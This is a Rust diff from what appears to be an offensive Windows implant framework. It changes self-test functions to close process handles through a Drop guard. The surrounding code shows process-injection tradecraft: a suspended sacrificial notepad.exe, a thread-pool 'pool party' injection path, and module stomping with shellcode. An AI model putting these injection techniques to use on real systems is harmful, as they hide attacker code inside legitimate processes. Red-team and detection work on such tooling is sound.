@@ -551,13 +551,10 @@ pub unsafe extern "system" fn nyx_selftest_inject() {
         let _ = unsafe { terminate(proc.handle, 1) };
         mask |= 1 << 3; // reached the terminate (clean teardown)
     }
-    // Close the handles (best-effort).
-    if let Some(ch_addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
-        type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
-        let close: CloseHandle = unsafe { core::mem::transmute(ch_addr) };
-        let _ = unsafe { close(proc.handle) };
-        let _ = unsafe { close(proc.main_thread) };
-    }
+    // The Drop guard on `proc` closes BOTH handles (its own terminate is a
+    // no-op on the already-dead process). Explicitly drop before exit() — the
+    // selftest's exit is noreturn, so scope-end Drop would never run.
+    core::mem::drop(proc);
     unsafe { exit(mask) };
 }
 
@@ -625,12 +622,10 @@ pub unsafe extern "system" fn nyx_selftest_inject_pool() {
         let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
         let _ = unsafe { terminate(proc.handle, 1) };
     }
-    if let Some(ch_addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
-        type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
-        let close: CloseHandle = unsafe { core::mem::transmute(ch_addr) };
-        let _ = unsafe { close(proc.handle) };
-        let _ = unsafe { close(proc.main_thread) };
-    }
+    // The Drop guard on `proc` closes BOTH handles (its own terminate is a
+    // no-op on the already-dead process). Explicitly drop before exit() — the
+    // selftest's exit is noreturn, so scope-end Drop would never run.
+    core::mem::drop(proc);
 
     crate::tp::set_pool_party_enabled(prev_gate);
     unsafe { exit(mask) };
@@ -1293,18 +1288,15 @@ pub unsafe extern "system" fn nyx_selftest_inject_armed() {
     match unsafe { crate::inject::create_sacrificial("notepad.exe") } {
         Ok(proc) => {
             mask |= 1 << 0; // create_sacrificial Ok
-                            // module_stomp creates its OWN sacrificial process; close this one.
-            if let Some(ch) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
-                type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
-                let close: CloseHandle = unsafe { core::mem::transmute(ch) };
-                let _ = unsafe { close(proc.handle) };
-                let _ = unsafe { close(proc.main_thread) };
-            }
+                            // module_stomp creates its OWN sacrificial process;
+                            // this one was only a liveness probe. The Drop
+                            // guard on `proc` terminates the never-resumed
+                            // sacrificial + closes both handles when this arm
+                            // ends.
             // The armed REAL inject path (creates + real-stomps + resumes its own).
             match unsafe { crate::inject::module_stomp("notepad.exe", &shellcode) } {
-                Ok(handle) => {
+                Ok(_proc) => {
                     mask |= 1 << 1; // full REAL stomp path returned Ok
-                    let _ = handle;
                 }
                 Err(_) => {}
             }
